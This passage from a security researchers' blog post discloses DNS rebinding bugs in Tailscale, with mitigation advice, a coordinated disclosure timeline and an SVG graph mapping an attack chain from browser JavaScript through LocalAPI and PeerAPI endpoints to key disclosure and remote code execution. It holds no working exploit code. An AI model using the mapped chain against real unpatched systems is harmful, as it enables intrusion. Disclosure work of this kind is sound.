<h3 id="implicitly-trusted-flat-network-with-internal-http-services-traditional-vpns"><a class="anchor" aria-hidden="true" tabindex="-1" href="#implicitly-trusted-flat-network-with-internal-http-services-traditional-vpns"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Implicitly-trusted flat network with internal HTTP services, traditional VPNs</h3><p>Traditionally, this case would be equivalent to the Tailscale case. However, the
advent of Private Network Access protection in Chromium-based browsers ends up
providing what appears to be effective protection against rebinding attacks for
these browsers in traditional private networks – protection which is
unfortunately not extended to Tailscale customers.</p>
<h3 id="recommendations"><a class="anchor" aria-hidden="true" tabindex="-1" href="#recommendations"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Recommendations</h3><p>This is a thorny issue, and we don&#39;t see an obvious mitigation for Tailscale to
implement. The onus thus shifts to Tailscale&#39;s customers.</p>
<p>If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated <em>or</em> rely on Tailscale for authentication, implement an
allowlist of expected HTTP <code>Host</code> headers to prevent malicious Javascript from
accessing these services.</p>
<p>This mitigation can be tested with <code>curl</code> – if you can put something random in
the <code>Host</code> header, and you can view information or take actions which should not
be available to the public, action is required:</p>
<p><img src="/posts/tailscale/dns-rebinding.png" alt="" title="" /></p>
<p>Alternatively, you can use Tailscale&#39;s built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either <a href="https://tailscale.com/blog/tls-certs/" title="null" rel="noopener noreferrer">directly</a> or via
something like <a href="https://tailscale.com/blog/caddy/" title="null" rel="noopener noreferrer">caddy</a>.</p>
<p>Tailscale has published remediation advice for this issue
<a href="https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks" title="null" rel="noopener noreferrer">here</a>.</p>
<h1 id="timeline-and-vendor-response"><a class="anchor" aria-hidden="true" tabindex="-1" href="#timeline-and-vendor-response"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Timeline and Vendor Response</h1><p>The speed and quality of Tailscale&#39;s response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.</p>
<p>Times in NZDT (UTC+13):</p>
<ul>
<li><strong>Mon 7 November</strong>: Emily starts research, identifies LocalAPI as rebindable</li>
<li><strong>Thu 10 November</strong>: Jamie joins research</li>
<li>...hacking in progress...</li>
<li><strong>Wed 16 November, 12:07AM</strong>: Report sent to <a href="mailto:&#115;&#101;&#99;&#x75;&#x72;&#x69;&#x74;&#x79;&#x40;&#x74;&#x61;&#105;&#108;&#x73;&#x63;&#x61;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;" title="undefined" rel="noopener noreferrer">&#115;&#101;&#99;&#x75;&#x72;&#x69;&#x74;&#x79;&#x40;&#x74;&#x61;&#105;&#108;&#x73;&#x63;&#x61;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;</a>, covering
all 7 issues</li>
<li><strong>Wed 16 November, 2:04AM</strong>: Confirmation of receipt</li>
<li><strong>Wed 16 November, 4:54AM-9:11AM</strong>: Fixes for issues 1/2/4/5/6 committed,
including several additional high-quality defence-in-depth mitigations on top
of our suggested fixes</li>
<li><strong>Wed 16 November, 8:36AM</strong>:
<a href="https://twitter.com/Tailscale/status/1592964802263289857" title="null" rel="noopener noreferrer">A bunch of Tailscale people are on a train</a>.
I&#39;m not really certain how this affects things, but it&#39;s pretty cool</li>
<li><strong>Wed 16 November, 10:52AM</strong>: Full reply from Tailscale, containing:<ul>
<li>Details of all fixes made so far;</li>
<li>Plans for additional fixes yet to be made, review of logs to check for past
exploitation, etc;</li>
<li>Request for our input on the completeness of the fix;</li>
<li>Estimate of coordinted disclosure timeline;</li>
<li>Vouchers for Tailscale Personal Pro accounts &amp; Tailscale Merch;</li>
<li>Offer of US$10,000 bounty, despite the Security page explicitly saying they
do not have a bounty program!</li>
</ul>
</li>
<li><strong>Wed 16 November, 4:17PM</strong>: We confirm that the major issues are resolved</li>
<li><strong>Wed 16 November, 6:51PM</strong>:
<a href="https://twitter.com/Tailscale/status/1593119669569081350" title="null" rel="noopener noreferrer">The train arrives in Seattle</a></li>
<li>...discussion and implementation of additional defense-in-depth measures;
issue 3 resolved...</li>
<li><strong>Sat 19 November</strong>: Coordinated Disclosure time proposed by Tailscale,
accepted by us, Tailscale shares planned Security Bulletins and blog post</li>
<li><strong>Tue 22 November, 5:06AM</strong>: Blog draft shared with Tailscale (a bit last
minute, sorry!!!)</li>
<li><strong>Tue 22 November, 7:00AM</strong>: Coordinated disclosure time</li>
</ul>
<hr>
<h3 id="co-authored-by"><a class="anchor" aria-hidden="true" tabindex="-1" href="#co-authored-by"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Co-Authored-By</h3><p>Jamie McClymont (<a href="https://twitter.com/JJJollyjim" title="null" rel="noopener noreferrer">twitter</a>,
<a href="https://cohost.org/jjjollyjim" title="null" rel="noopener noreferrer">cohost</a>,
<a href="https://social.memes.nz/@jamie" title="null" rel="noopener noreferrer">mastodon</a>)</p>
<blockquote>
<p>ps. I&#39;m looking for work. Come say hi! 👋</p>
<p>- Emily 💖</p>
</blockquote>
<h1 id="superfluous-graphviz"><a class="anchor" aria-hidden="true" tabindex="-1" href="#superfluous-graphviz"><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Superfluous GraphViz</h1><svg viewBox="0.00 0.00 1408.99 1262.40" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(21.6 1240.8)">
<polygon fill="#ffffff" stroke="transparent" points="-21.6,21.6 -21.6,-1240.8 1387.3949,-1240.8 1387.3949,21.6 -21.6,21.6"></polygon>
<!-- foothold -->
<g id="node1" class="node">
<title>foothold</title>
<ellipse fill="none" stroke="#000000" cx="671.1103" cy="-1112.4" rx="149.8357" ry="18"></ellipse>
<text text-anchor="middle" x="671.1103" y="-1108.2" font-family="sans-serif" font-size="14.00" fill="#000000">Attacker runs JS in target's browser</text>
</g>
<!-- LocalAPI is same&#45;origin -->
<g id="node3" class="node">
<title>LocalAPI is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="597.1103" cy="-529.2" rx="105.9344" ry="18"></ellipse>
<text text-anchor="middle" x="597.1103" y="-525" font-family="sans-serif" font-size="14.00" fill="#000000">LocalAPI is same-origin</text>
</g>
<!-- foothold&#45;&gt;LocalAPI is same&#45;origin -->
<g id="edge2" class="edge">
<title>foothold-&gt;LocalAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M671.1103,-1094.3721C671.1103,-1076.4311 671.1103,-1048.1125 671.1103,-1023.6 671.1103,-1023.6 671.1103,-1023.6 671.1103,-637.2 671.1103,-604.6007 675.8177,-591.8973 657.1103,-565.2 653.6269,-560.2289 649.2174,-555.8268 644.376,-551.961"></path>
<polygon fill="#404040" stroke="#404040" points="646.0896,-548.8855 635.9079,-545.9558 642.0403,-554.5954 646.0896,-548.8855"></polygon>
<text text-anchor="middle" x="846.6402" y="-851.4" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 1: LocalAPI Rebinding</text>
<text text-anchor="middle" x="846.6402" y="-834.6" font-family="sans-serif" font-size="14.00" fill="#000000">if (Windows and</text>
<text text-anchor="middle" x="846.6402" y="-817.8" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Firefox or same physical network or same tailnet)) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</text>
</g>
<!-- Quad100 is same&#45;origin -->
<g id="node4" class="node">
<title>Quad100 is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="472.1103" cy="-1023.6" rx="103.6566" ry="18"></ellipse>
<text text-anchor="middle" x="472.1103" y="-1019.4" font-family="sans-serif" font-size="14.00" fill="#000000">Quad100 is same-origin</text>
</g>
<!-- foothold&#45;&gt;Quad100 is same&#45;origin -->
<g id="edge3" class="edge">
<title>foothold-&gt;Quad100 is same-origin</title>
<path fill="none" stroke="#404040" d="M547.8774,-1102.1595C514.9512,-1096.8044 485.4944,-1088.6854 474.7295,-1076.4 468.8605,-1069.7021 467.0643,-1060.4961 467.0965,-1051.6457"></path>
<polygon fill="#404040" stroke="#404040" points="470.593,-1051.8218 467.8399,-1041.5909 463.612,-1051.3056 470.593,-1051.8218"></polygon>
<text text-anchor="middle" x="566.3007" y="-1063.8" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;Bug 4: Quad100 Rebinding &nbsp;&nbsp;&nbsp;</text>
</g>
<!-- Impersonation on Tailnet -->
<g id="node5" class="node">
<title>Impersonation on Tailnet</title>
<polygon fill="none" stroke="#000000" points="1062.1103,-336 860.1103,-336 860.1103,-300 1062.1103,-300 1062.1103,-336"></polygon>
<text text-anchor="middle" x="961.1103" y="-313.8" font-family="sans-serif" font-size="14.00" fill="#000000">Impersonation on Tailnet</text>
</g>
<!-- foothold&#45;&gt;Impersonation on Tailnet -->
<g id="edge4" class="edge">
<title>foothold-&gt;Impersonation on Tailnet</title>
<path fill="none" stroke="#404040" d="M809.8152,-1105.612C918.0318,-1096.3859 1050.1103,-1074.6656 1050.1103,-1023.6 1050.1103,-1023.6 1050.1103,-1023.6 1050.1103,-423.6 1050.1103,-392.0471 1055.478,-378.9094 1036.1103,-354 1032.4754,-349.3251 1028.0811,-345.2243 1023.2638,-341.6335"></path>
<polygon fill="#404040" stroke="#404040" points="1025.0914,-338.6461 1014.8168,-336.0607 1021.2365,-344.4891 1025.0914,-338.6461"></polygon>
<text text-anchor="middle" x="1207.9526" y="-747" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bug 7: Rebinding to other Tailnet services</text>
<text text-anchor="middle" x="1207.9526" y="-730.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (services speak plain HTTP without Host check)</text>
</g>
<!-- Start -->
<g id="node2" class="node">
<title>Start</title>
<ellipse fill="none" stroke="#000000" cx="671.1103" cy="-1201.2" rx="29.049" ry="18"></ellipse>
<text text-anchor="middle" x="671.1103" y="-1197" font-family="sans-serif" font-size="14.00" fill="#000000">Start</text>
</g>
<!-- Start&#45;&gt;foothold -->
<g id="edge1" class="edge">
<title>Start-&gt;foothold</title>
<path fill="none" stroke="#404040" d="M671.1103,-1182.8006C671.1103,-1170.6949 671.1103,-1154.6076 671.1103,-1140.8674"></path>
<polygon fill="#404040" stroke="#404040" points="674.6104,-1140.472 671.1103,-1130.472 667.6104,-1140.4721 674.6104,-1140.472"></polygon>
<text text-anchor="middle" x="801.3698" y="-1152.6" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Phishing, Malvertising, XSS of 3rd-parties</text>
</g>
<!-- Tailnet information disclosure -->
<g id="node13" class="node">
<title>Tailnet information disclosure</title>
<polygon fill="none" stroke="#000000" points="455.1103,-441.6 239.1103,-441.6 239.1103,-405.6 455.1103,-405.6 455.1103,-441.6"></polygon>
<text text-anchor="middle" x="347.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Tailnet information disclosure</text>
</g>
<!-- LocalAPI is same&#45;origin&#45;&gt;Tailnet information disclosure -->
<g id="edge16" class="edge">
<title>LocalAPI is same-origin-&gt;Tailnet information disclosure</title>
<path fill="none" stroke="#404040" d="M557.497,-512.4674C514.7328,-494.4037 446.428,-465.5518 399.3087,-445.6486"></path>
<polygon fill="#404040" stroke="#404040" points="400.4608,-442.3359 389.887,-441.6689 397.737,-448.7842 400.4608,-442.3359"></polygon>
<text text-anchor="middle" x="546.4371" y="-480.6" font-family="sans-serif" font-size="14.00" fill="#000000">GET status,</text>
<text text-anchor="middle" x="546.4371" y="-463.8" font-family="sans-serif" font-size="14.00" fill="#000000">GET whois...</text>
</g>
<!-- Node Private Key disclosure -->
<g id="node14" class="node">
<title>Node Private Key disclosure</title>
<ellipse fill="none" stroke="#000000" cx="866.1103" cy="-423.6" rx="121.5709" ry="18"></ellipse>
<text text-anchor="middle" x="866.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Node Private Key disclosure</text>
</g>
<!-- LocalAPI is same&#45;origin&#45;&gt;Node Private Key disclosure -->
<g id="edge14" class="edge">
<title>LocalAPI is same-origin-&gt;Node Private Key disclosure</title>
<path fill="none" stroke="#404040" d="M684.431,-518.9071C713.1886,-513.5282 744.7806,-505.4084 772.1103,-493.2 797.0309,-482.0677 821.6963,-463.438 839.5043,-448.253"></path>
<polygon fill="#404040" stroke="#404040" points="841.9447,-450.7688 847.1801,-441.5578 837.3434,-445.4935 841.9447,-450.7688"></polygon>
<text text-anchor="middle" x="862.793" y="-472.2" font-family="sans-serif" font-size="14.00" fill="#000000">PATCH prefs</text>
</g>
<!-- Pending ControlURL change -->
<g id="node15" class="node">
<title>Pending ControlURL change</title>
<ellipse fill="none" stroke="#000000" cx="597.1103" cy="-423.6" rx="123.864" ry="18"></ellipse>
<text text-anchor="middle" x="597.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Pending ControlURL change</text>
</g>
<!-- LocalAPI is same&#45;origin&#45;&gt;Pending ControlURL change -->
<g id="edge17" class="edge">
<title>LocalAPI is same-origin-&gt;Pending ControlURL change</title>
<path fill="none" stroke="#404040" d="M597.1103,-510.8059C597.1103,-494.5279 597.1103,-470.5223 597.1103,-451.8163"></path>
<polygon fill="#404040" stroke="#404040" points="600.6104,-451.7833 597.1103,-441.7833 593.6104,-451.7834 600.6104,-451.7833"></polygon>
<text text-anchor="middle" x="682.8407" y="-472.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;PATCH prefs (ControlURL)</text>
</g>
<!-- Tailnet IP known -->
<g id="node6" class="node">
<title>Tailnet IP known</title>
<ellipse fill="none" stroke="#000000" cx="377.1103" cy="-934.8" rx="78.1714" ry="18"></ellipse>
<text text-anchor="middle" x="377.1103" y="-930.6" font-family="sans-serif" font-size="14.00" fill="#000000">Tailnet IP known</text>
</g>
<!-- Quad100 is same&#45;origin&#45;&gt;Tailnet IP known -->
<g id="edge5" class="edge">
<title>Quad100 is same-origin-&gt;Tailnet IP known</title>
<path fill="none" stroke="#404040" d="M452.8856,-1005.63C438.6281,-992.303 419.027,-973.9811 403.3324,-959.3108"></path>
<polygon fill="#404040" stroke="#404040" points="405.6776,-956.712 395.9821,-952.4402 400.8976,-961.8258 405.6776,-956.712"></polygon>
<text text-anchor="middle" x="451.4115" y="-975" font-family="sans-serif" font-size="14.00" fill="#000000">GET /</text>
</g>
<!-- PeerAPI address known -->
<g id="node7" class="node">
<title>PeerAPI address known</title>
<ellipse fill="none" stroke="#000000" cx="353.1103" cy="-838.8" rx="103.6354" ry="18"></ellipse>
<text text-anchor="middle" x="353.1103" y="-834.6" font-family="sans-serif" font-size="14.00" fill="#000000">PeerAPI address known</text>
</g>
<!-- Tailnet IP known&#45;&gt;PeerAPI address known -->
<g id="edge6" class="edge">
<title>Tailnet IP known-&gt;PeerAPI address known</title>
<path fill="none" stroke="#404040" d="M372.5961,-916.7431C369.0985,-902.753 364.1884,-883.1125 360.1722,-867.0476"></path>
<polygon fill="#404040" stroke="#404040" points="363.5068,-865.9548 357.6858,-857.1023 356.7158,-867.6526 363.5068,-865.9548"></polygon>
<text text-anchor="middle" x="456.9543" y="-886.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;Deterministic port algorithm</text>
</g>
<!-- PeerAPI is same&#45;origin -->
<g id="node8" class="node">
<title>PeerAPI is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="347.1103" cy="-742.8" rx="101.2776" ry="18"></ellipse>
<text text-anchor="middle" x="347.1103" y="-738.6" font-family="sans-serif" font-size="14.00" fill="#000000">PeerAPI is same-origin</text>
</g>
<!-- PeerAPI address known&#45;&gt;PeerAPI is same&#45;origin -->
<g id="edge7" class="edge">
<title>PeerAPI address known-&gt;PeerAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M351.9817,-820.7431C351.1157,-806.8862 349.9032,-787.4861 348.9045,-771.5075"></path>
<polygon fill="#404040" stroke="#404040" points="352.3712,-770.8645 348.2542,-761.1023 345.3849,-771.3012 352.3712,-770.8645"></polygon>
<text text-anchor="middle" x="433.3512" y="-783" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;Bug 5: PeerAPI Rebinding</text>
</g>
<!-- Malware sitting on machine -->
<g id="node9" class="node">
<title>Malware sitting on machine</title>
<ellipse fill="none" stroke="#000000" cx="119.1103" cy="-583.2" rx="119.2206" ry="18"></ellipse>
<text text-anchor="middle" x="119.1103" y="-579" font-family="sans-serif" font-size="14.00" fill="#000000">Malware sitting on machine</text>
</g>
<!-- PeerAPI is same&#45;origin&#45;&gt;Malware sitting on machine -->
<g id="edge8" class="edge">
<title>PeerAPI is same-origin-&gt;Malware sitting on machine</title>
<path fill="none" stroke="#404040" d="M260.1533,-733.5616C203.3894,-726.6681 138.1518,-716.7585 128.9945,-706.8 105.6086,-681.368 107.6607,-639.2435 112.4466,-611.3528"></path>
<polygon fill="#404040" stroke="#404040" points="115.9041,-611.9077 114.3673,-601.4249 109.0315,-610.578 115.9041,-611.9077"></polygon>
<text text-anchor="middle" x="189.1682" y="-694.2" font-family="sans-serif" font-size="14.00" fill="#000000">/v0/put/ &nbsp;</text>
<text text-anchor="middle" x="189.1682" y="-677.4" font-family="sans-serif" font-size="14.00" fill="#000000">if(Taildrop enabled) &nbsp;</text>
</g>
<!-- Persistant file in Taildrop inbox -->
<g id="node11" class="node">
<title>Persistant file in Taildrop inbox</title>
<ellipse fill="none" stroke="#000000" cx="509.1103" cy="-637.2" rx="133.7458" ry="18"></ellipse>
<text text-anchor="middle" x="509.1103" y="-633" font-family="sans-serif" font-size="14.00" fill="#000000">Persistant file in Taildrop inbox</text>
</g>
<!-- PeerAPI is same&#45;origin&#45;&gt;Persistant file in Taildrop inbox -->
<g id="edge10" class="edge">
<title>PeerAPI is same-origin-&gt;Persistant file in Taildrop inbox</title>
<path fill="none" stroke="#404040" d="M373.8613,-725.3623C401.0987,-707.6075 443.4824,-679.9796 473.5361,-660.3891"></path>
<polygon fill="#404040" stroke="#404040" points="475.5832,-663.2327 482.0493,-654.8398 471.7606,-657.3685 475.5832,-663.2327"></polygon>
<text text-anchor="middle" x="510.4182" y="-694.2" font-family="sans-serif" font-size="14.00" fill="#000000">Spam /v0/put/</text>
<text text-anchor="middle" x="510.4182" y="-677.4" font-family="sans-serif" font-size="14.00" fill="#000000">if (Taildrop enabled)</text>
</g>
<!-- Env disclosure -->
<g id="node12" class="node">
<title>Env disclosure</title>
<polygon fill="none" stroke="#000000" points="316.6103,-655.2 201.6103,-655.2 201.6103,-619.2 316.6103,-619.2 316.6103,-655.2"></polygon>
<text text-anchor="middle" x="259.1103" y="-633" font-family="sans-serif" font-size="14.00" fill="#000000">Env disclosure</text>
</g>
<!-- PeerAPI is same&#45;origin&#45;&gt;Env disclosure -->
<g id="edge12" class="edge">
<title>PeerAPI is same-origin-&gt;Env disclosure</title>
<path fill="none" stroke="#404040" d="M286.4776,-728.3372C276.2186,-723.1947 266.8253,-716.2301 260.4027,-706.8 252.3505,-694.9774 251.4678,-679.2093 252.8463,-665.6712"></path>
<polygon fill="#404040" stroke="#404040" points="256.3629,-665.8105 254.3428,-655.41 249.4362,-664.8002 256.3629,-665.8105"></polygon>
<text text-anchor="middle" x="297.4641" y="-685.8" font-family="sans-serif" font-size="14.00" fill="#000000">GET /v0/env</text>
</g>
<!-- PeerAPI is same&#45;origin&#45;&gt;Tailnet information disclosure -->
<g id="edge13" class="edge">
<title>PeerAPI is same-origin-&gt;Tailnet information disclosure</title>
<path fill="none" stroke="#404040" d="M347.1103,-724.7239C347.1103,-671.7383 347.1103,-516.4962 347.1103,-452.1002"></path>
<polygon fill="#404040" stroke="#404040" points="350.6104,-451.8735 347.1103,-441.8735 343.6104,-451.8736 350.6104,-451.8735"></polygon>
<text text-anchor="middle" x="410.2916" y="-579" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;GET /v0/magicsock</text>
</g>
<!-- RCE -->
<g id="node10" class="node">
<title>RCE</title>
<polygon fill="none" stroke="#000000" points="199.1103,-36 145.1103,-36 145.1103,0 199.1103,0 199.1103,-36"></polygon>
<text text-anchor="middle" x="172.1103" y="-13.8" font-family="sans-serif" font-size="14.00" fill="#000000">RCE</text>
</g>
<!-- Malware sitting on machine&#45;&gt;RCE -->
<g id="edge9" class="edge">
<title>Malware sitting on machine-&gt;RCE</title>
<path fill="none" stroke="#404040" stroke-dasharray="5,2" d="M119.93,-565.0632C120.8183,-543.819 122.1103,-507.5623 122.1103,-476.4 122.1103,-476.4 122.1103,-476.4 122.1103,-123.6 122.1103,-94.6216 137.681,-65.1004 151.444,-44.6665"></path>
<polygon fill="#404040" stroke="#404040" points="154.4918,-46.417 157.3791,-36.2231 148.765,-42.3915 154.4918,-46.417"></polygon>
<text text-anchor="middle" x="224.5735" y="-322.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;Bug 3: MotW not set by Taildrop</text>
<text text-anchor="middle" x="224.5735" y="-305.4" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;if (user launches executable)</text>
</g>
<!-- Persistant file in Taildrop inbox&#45;&gt;LocalAPI is same&#45;origin -->
<g id="edge11" class="edge">
<title>Persistant file in Taildrop inbox-&gt;LocalAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M511.1544,-619.1527C513.748,-603.4112 519.5366,-580.7257 532.2891,-565.2 536.571,-559.987 541.8162,-555.3996 547.4509,-551.4003"></path>
<polygon fill="#404040" stroke="#404040" points="549.3991,-554.3087 555.9183,-545.9571 545.6138,-548.4205 549.3991,-554.3087"></polygon>
<text text-anchor="middle" x="595.5209" y="-587.4" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 6: LocalAPI XSS</text>
<text text-anchor="middle" x="595.5209" y="-570.6" font-family="sans-serif" font-size="14.00" fill="#000000">if (Windows)</text>
</g>
<!-- Node Private Key disclosure&#45;&gt;Impersonation on Tailnet -->
<g id="edge15" class="edge">
<title>Node Private Key disclosure-&gt;Impersonation on Tailnet</title>
<path fill="none" stroke="#404040" d="M866.5004,-405.3948C867.7302,-390.1064 871.6905,-368.4963 883.6909,-354 887.5663,-349.3186 892.1862,-345.2132 897.2127,-341.6196"></path>
<polygon fill="#404040" stroke="#404040" points="899.4296,-344.3579 905.9961,-336.0434 895.6778,-338.4483 899.4296,-344.3579"></polygon>
<text text-anchor="middle" x="959.32" y="-375" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;Unknown preconditions, &nbsp;</text>
<text text-anchor="middle" x="959.32" y="-358.2" font-family="sans-serif" font-size="14.00" fill="#000000">untested</text>
</g>
<!-- Target joins malicious Headscale -->
<g id="node16" class="node">
<title>Target joins malicious Headscale</title>
<ellipse fill="none" stroke="#000000" cx="490.1103" cy="-318" rx="139.4613" ry="18"></ellipse>
<text text-anchor="middle" x="490.1103" y="-313.8" font-family="sans-serif" font-size="14.00" fill="#000000">Target joins malicious Headscale</text>
</g>
<!-- Pending ControlURL change&#45;&gt;Target joins malicious Headscale -->
<g id="edge18" class="edge">
<title>Pending ControlURL change-&gt;Target joins malicious Headscale</title>
<path fill="none" stroke="#404040" d="M532.2372,-408.1857C513.5804,-402.3789 496.7373,-395.2988 491.1355,-387.6 482.58,-375.842 481.8407,-359.7605 483.4601,-346.0176"></path>
<polygon fill="#404040" stroke="#404040" points="486.9267,-346.505 485.0678,-336.0745 480.0164,-345.3877 486.9267,-346.505"></polygon>
<text text-anchor="middle" x="534.0977" y="-366.6" font-family="sans-serif" font-size="14.00" fill="#000000">Await reboot &nbsp;&nbsp;</text>
</g>
<!-- Pending ControlURL change&#45;&gt;Target joins malicious Headscale -->
<g id="edge19" class="edge">
<title>Pending ControlURL change-&gt;Target joins malicious Headscale</title>
<path fill="none" stroke="#404040" d="M595.5856,-405.5275C593.3979,-390.1136 588.0725,-368.2485 575.1103,-354 569.8782,-348.2487 563.5764,-343.3844 556.7982,-339.2774"></path>
<polygon fill="#404040" stroke="#404040" points="558.456,-336.1948 548.0025,-334.4704 555.0991,-342.3374 558.456,-336.1948"></polygon>
<text text-anchor="middle" x="647.1149" y="-375" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;PUT profile</text>
<text text-anchor="middle" x="647.1149" y="-358.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;if (future version)</text>
</g>
<!-- Target joins malicious Headscale&#45;&gt;RCE -->
<g id="edge23" class="edge">
<title>Target joins malicious Headscale-&gt;RCE</title>
<path fill="none" stroke="#404040" stroke-dasharray="5,2" d="M424.992,-301.9824C339.9835,-279.6023 198.4804,-236.7991 168.6369,-193.2 138.4002,-149.0266 151.3697,-82.8078 162.436,-45.7173"></path>
<polygon fill="#404040" stroke="#404040" points="165.8084,-46.6603 165.4693,-36.0709 159.1308,-44.5605 165.8084,-46.6603"></polygon>
<text text-anchor="middle" x="303.847" y="-180.6" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;Bug 2: Control pops SMB executable path &nbsp;&nbsp;&nbsp;</text>
<text text-anchor="middle" x="303.847" y="-163.8" font-family="sans-serif" font-size="14.00" fill="#000000">if (user clicks through warning)</text>
</g>
<!-- Local network access -->
<g id="node17" class="node">
<title>Local network access</title>
<polygon fill="none" stroke="#000000" points="752.6103,-247.2 601.6103,-247.2 601.6103,-211.2 752.6103,-211.2 752.6103,-247.2"></polygon>
<text text-anchor="middle" x="677.1103" y="-225" font-family="sans-serif" font-size="14.00" fill="#000000">Local network access</text>
</g>
<!-- Target joins malicious Headscale&#45;&gt;Local network access -->
<g id="edge20" class="edge">
<title>Target joins malicious Headscale-&gt;Local network access</title>
<path fill="none" stroke="#404040" d="M585.8241,-304.8222C615.661,-299.0911 643.742,-291.4865 655.1103,-282 662.7253,-275.6454 667.7471,-266.2127 671.04,-257.0707"></path>
